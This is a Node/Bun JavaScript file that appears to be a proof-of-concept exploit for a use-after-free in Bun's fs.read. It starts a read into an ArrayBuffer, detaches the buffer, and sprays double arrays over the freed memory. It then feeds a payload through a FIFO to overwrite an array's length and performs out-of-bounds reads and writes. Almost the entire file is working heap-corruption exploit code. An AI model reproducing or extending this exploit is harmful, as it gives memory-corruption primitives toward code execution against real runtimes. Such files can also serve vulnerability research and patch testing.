import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 64);
const size = Number(process.env.BUF_SIZE || 8192);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const slots = Number(process.env.SLOTS || 1024);
const writeOffset = Number(process.env.WRITE_OFFSET || 136);
const newLength = Number(process.env.NEW_LENGTH || 2048);
const readOOB = process.env.READ_OOB === "1";
const oobCount = Number(process.env.OOB_COUNT || 16);
const oobWriteIndex = process.env.OOB_WRITE_INDEX === undefined ? -1 : Number(process.env.OOB_WRITE_INDEX);
const oobWriteValue = Number(process.env.OOB_WRITE_VALUE || 7.291122019556398e-304);
const path = join(tmpdir(), `bun-fs-read-array-metadata-write-${process.pid}`);
const retained = [];

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
const fd = fs.openSync(path, fs.constants.O_RDWR);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function allocateDoubleArrays() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = 6000.5 + i + (j / 1024);
    out.push(arr);
  }
  return out;
}

function makeLengthPayload() {
  const payload = Buffer.alloc(8);
  payload.writeUInt32LE(newLength >>> 0, 0);
  payload.writeUInt32LE(newLength >>> 0, 4);
  return payload;
}

function summarizeOOB(arr) {
  if (!readOOB) return undefined;

  const nonZero = [];
  const nonNumber = [];
  let zeroCount = 0;
  for (let j = 0; j < oobCount; j++) {
    const value = arr[slots + j];
    if (value === 0) {
      zeroCount++;
      continue;
    }

    if (typeof value !== "number") {
      if (nonNumber.length < 16) nonNumber.push({ relativeIndex: j, value: String(value) });
      continue;
    }

    if (nonZero.length < 32) nonZero.push({ relativeIndex: j, value });
  }

  return { count: oobCount, zeroCount, nonZero, nonNumber };
}

function scanCollateralChanges(sourceIndex) {
  const changed = [];
  for (let i = 0; i < retained.length; i++) {
    if (i === sourceIndex) continue;
    const arr = retained[i];
    if (arr.length !== slots || arr[0] !== 6000.5 + i || arr[slots - 1] !== 6000.5 + i + ((slots - 1) / 1024)) {
      changed.push({
        arrayIndex: i,
        length: arr.length,
        first: arr[0],
        lastInBounds: arr[slots - 1],
      });
      if (changed.length >= 16) break;
    }
  }
  return changed;
}

function findLengthChange() {
  for (let i = 0; i < retained.length; i++) {
    const arr = retained[i];
    if (arr.length !== slots) {
      let oobWrite;
      if (oobWriteIndex >= 0) {
        arr[slots + oobWriteIndex] = oobWriteValue;
        oobWrite = {
          relativeIndex: oobWriteIndex,
          value: arr[slots + oobWriteIndex],
        };
      }
      return {
        arrayIndex: i,
        length: arr.length,
        first: arr[0],
        lastInBounds: arr[slots - 1],
        oob: summarizeOOB(arr),
        oobWrite,
        collateral: scanCollateralChanges(i),
      };
    }
  }
  return null;
}

async function runOne(iteration) {
  const ab = new ArrayBuffer(size);
  const view = new Uint8Array(ab);
  view.fill(0x51);

  const done = new Promise(resolve => {
    fs.read(fd, view, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  detach(ab);
  gcNow();
  retained.length = 0;
  retained.push(...allocateDoubleArrays());
  gcNow();

  fs.writeSync(fd, makeLengthPayload(), 0, 8);
  const result = await done;
  const changed = findLengthChange();
  console.log(JSON.stringify({
    iteration,
    size,
    sprayCount,
    slots,
    writeOffset,
    newLength,
    bytesRead: result.bytesRead,
    err: result.err?.message,
    changed,
  }));
  return Boolean(changed);
}

try {
  for (let i = 1; i <= iterations; i++) {
    if (await runOne(i)) {
      process.exitCode = 86;
      break;
    }
  }
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}
